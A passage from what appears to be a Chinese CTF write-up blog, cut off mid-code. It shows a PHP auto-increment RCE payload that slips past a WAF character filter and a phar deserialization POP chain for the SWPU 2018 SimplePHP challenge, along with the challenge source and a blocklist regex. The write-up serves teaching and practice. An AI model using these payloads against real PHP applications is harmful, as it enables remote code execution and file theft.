<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//自增rce</span></span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">32</span>;<span class="variable">$i</span>&lt;<span class="number">127</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\-&lt;?&gt;\&quot;\/|`a-zA-Z~\\\\]/&quot;</span>, <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>))) &#123;</span><br><span class="line">        <span class="variable">$pass</span> = <span class="variable">$pass</span>.<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;当前能过waf的字符：&quot;</span>.<span class="variable">$pass</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment">#当前能过waf的字符： $()+,.0123456789;=[]_&#123;&#125;</span></span><br></pre></td></tr></table></figure>

<p>那么利用这些字符来进行rce，是自增型rce，但是限制了长度，所以要进行一些简化，来了解一下自增的过程</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;_&#x27;</span>; <span class="comment">//空数组拼接一个字符，会将空数组变成字符串Array</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>[<span class="number">1</span>];<span class="comment">//$__是r</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="number">0</span>];<span class="comment">//$_这时是A</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//$_这时是B，每++一次就是下一个字母</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//C</span></span><br><span class="line"><span class="variable">$_0</span>=<span class="variable">$_</span>;<span class="comment">//把c给$_0</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//D</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//E</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//F</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//G</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_0</span>.++<span class="variable">$_</span>.<span class="variable">$__</span>;<span class="comment">//$_=CHr</span></span><br><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;_&#x27;</span>.<span class="variable">$_</span>(<span class="number">71</span>).<span class="variable">$_</span>(<span class="number">69</span>).<span class="variable">$_</span>(<span class="number">84</span>);<span class="comment">//$_=&#x27;_&#x27;.CHR(71).CHR(69).CHR(84) -&gt; $_=_GET</span></span><br><span class="line"><span class="comment">//$$_[1]($$_[2]);//$_GET[1]($_GET[2])</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>;</span><br><span class="line"><span class="comment">#_GET</span></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//整理成一行并且在浏览器中传参的形式：</span><br><span class="line">$_=[]._;$__=$_[1];$_=$_[0];$_++;$_0=++$_;$_++;$_++;$_++;$_++;$_=$_0.++$_.$__;$_=_.$_(71).$_(69).$_(84);$$_[1]($$_[2]);</span><br></pre></td></tr></table></figure>

<p>对所有特殊字符进行url编码，得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_%3d[]._%3b$__%3d$_[1]%3b$_%3d$_[0]%3b$_%2b%2b%3b$_0%3d%2b%2b$_%3b$_%2b%2b%3b$_%2b%2b%3b$_%2b%2b%3b$_%2b%2b%3b$_%3d$_0.%2b%2b$_.$__%3b$_%3d_.$_(71).$_(69).$_(84)%3b$$_[1]($$_[2])%3b</span><br></pre></td></tr></table></figure>

<p>然后再传get参数1、2即可</p>
<p><img src="/images/image-20240110135927136.png" alt="image-20240110135927136"></p>
<h1 id="184-SWPU-2018-SimplePHP"><a href="#184-SWPU-2018-SimplePHP" class="headerlink" title="184.[SWPU 2018]SimplePHP"></a>184.[SWPU 2018]SimplePHP</h1><p>在查看文件处是<code>file.php?file=</code>，etc&#x2F;passwd没读到，试下<code>var/www/html/index.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;base.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><code>file.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>; </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/var/www/html/&#x27;</span>); </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>] ? <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] : <span class="string">&quot;&quot;</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$file</span>)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(); </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>)) &#123; </span><br><span class="line">    <span class="variable">$show</span>-&gt;source = <span class="variable">$file</span>; </span><br><span class="line">    <span class="variable">$show</span>-&gt;<span class="title function_ invoke__">_show</span>(); </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$file</span>))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><code>open_basedir</code>解释了为什么读不到etc&#x2F;passwd，来读读<code>upload_file.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include &#x27;function.php&#x27;; </span><br><span class="line">upload_file(); </span><br><span class="line">?&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta charest=&quot;utf-8&quot;&gt; </span><br><span class="line">&lt;title&gt;文件上传&lt;/title&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;div align = &quot;center&quot;&gt; </span><br><span class="line">        &lt;h1&gt;前端写得很low,请各位师傅见谅!&lt;/h1&gt; </span><br><span class="line">&lt;/div&gt; </span><br><span class="line">&lt;style&gt; </span><br><span class="line">    p&#123; margin:0 auto&#125; </span><br><span class="line">&lt;/style&gt; </span><br><span class="line">&lt;div&gt; </span><br><span class="line">&lt;form action=&quot;upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; </span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;文件名:&lt;/label&gt; </span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt; </span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt; </span><br><span class="line">&lt;/div&gt; </span><br><span class="line"></span><br><span class="line">&lt;/script&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html</span><br></pre></td></tr></table></figure>

<p><code>base.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    session_start(); </span><br><span class="line">?&gt; </span><br><span class="line">&lt;!DOCTYPE html&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt; </span><br><span class="line">    &lt;title&gt;web3&lt;/title&gt; </span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;&gt; </span><br><span class="line">    &lt;script src=&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt; </span><br><span class="line">    &lt;script src=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;&gt;&lt;/script&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">    &lt;nav class=&quot;navbar navbar-default&quot; role=&quot;navigation&quot;&gt; </span><br><span class="line">        &lt;div class=&quot;container-fluid&quot;&gt; </span><br><span class="line">        &lt;div class=&quot;navbar-header&quot;&gt; </span><br><span class="line">            &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;首页&lt;/a&gt; </span><br><span class="line">        &lt;/div&gt; </span><br><span class="line">            &lt;ul class=&quot;nav navbar-nav navbra-toggle&quot;&gt; </span><br><span class="line">                &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;file.php?file=&quot;&gt;查看文件&lt;/a&gt;&lt;/li&gt; </span><br><span class="line">                &lt;li&gt;&lt;a href=&quot;upload_file.php&quot;&gt;上传文件&lt;/a&gt;&lt;/li&gt; </span><br><span class="line">            &lt;/ul&gt; </span><br><span class="line">            &lt;ul class=&quot;nav navbar-nav navbar-right&quot;&gt; </span><br><span class="line">                &lt;li&gt;&lt;a href=&quot;index.php&quot;&gt;&lt;span class=&quot;glyphicon glyphicon-user&quot;&gt;&lt;/span&gt;&lt;?php echo $_SERVER[&#x27;REMOTE_ADDR&#x27;];?&gt;&lt;/a&gt;&lt;/li&gt; </span><br><span class="line">            &lt;/ul&gt; </span><br><span class="line">        &lt;/div&gt; </span><br><span class="line">    &lt;/nav&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt; </span><br><span class="line">&lt;!--flag is in f1ag.php--&gt;</span><br></pre></td></tr></table></figure>

<p><code>function.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>; </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>].<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; </span><br><span class="line">    <span class="comment">//mkdir(&quot;upload&quot;,0777); </span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>)) &#123; </span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">upload_file_check</span>()) &#123; </span><br><span class="line">        <span class="title function_ invoke__">upload_file_do</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>); </span><br><span class="line">    <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]); </span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$extension</span>)) &#123; </span><br><span class="line">        <span class="comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><code>class.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="variable language_">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;   <span class="comment">//$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file_get</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>跟传文件有关系的，限制路径，不能自由读文件的，跟解析没关系的，还找到类文件，大概率就是phar反序列化题，先分析一下<code>function.php</code>，只允许图片类型，传完文件会删除重复文件，会把文件名拼接客户端IP地址的结果进行md5处理作为文件名，后缀必是jpg，也就是我们传上去的文件在服务器存储的形式是<code>upload/32位hash.jpg</code>。所以我们等下要根据这个计算出我们上传触发反序列化的phar文件名是什么。</p>
<p>接下来分析<code>class.php</code>找链子，在<code>Test</code>类中的<code>file_get</code>方法里存在<code>file_get_contents</code>，<code>get</code>方法调用了<code>file_get</code>，<code>__get</code>方法调用了<code>get</code>，所以要触发<code>Test</code>类中的<code>__get</code>，而<code>__get是在读取不可访问或者不存在的属性的时候，进行赋值</code>，我们看到<code>Show</code> 类下的<code>__toString</code>存在<code>$content=$this-&gt;str[&#39;str&#39;]-&gt;source;</code>，会去访问<code>source</code>这个成员，而<code>Test</code>类不存在<code>source</code>，所以可以触发它的<code>__get</code>，所以要触发<code>Show</code>的<code>__toString</code>，在类<code>C1e4r</code>的<code>__destruct</code>中，存在<code>echo $this-&gt;test</code>，将变量<code>test</code>作为字符串处理，会触发<code>__toString</code>，这样链子就很清晰了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C1e4r-&gt;__destruct-&gt;Show-&gt;__toString-&gt;File-&gt;__get-&gt;get-&gt;file_get-&gt;file_get_content</span><br></pre></td></tr></table></figure>

<p>重写Show和Test的构造函数，让<code>Show-&gt;str[&#39;str&#39;]=new Test()</code>，然后它在<code>__toString()</code>里访问了<code>Test</code>对象中不存在的<code>source</code>属性，就会触发<code>__get</code>，让<code>Test-&gt;params[&#39;source&#39;]=&#39;/var/www/html/f1ag.php&#39;</code>，就能过<code>if(isset($this-&gt;params[$key]))</code>最终读取flag</p>
<p>到这里，可以写exp了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span 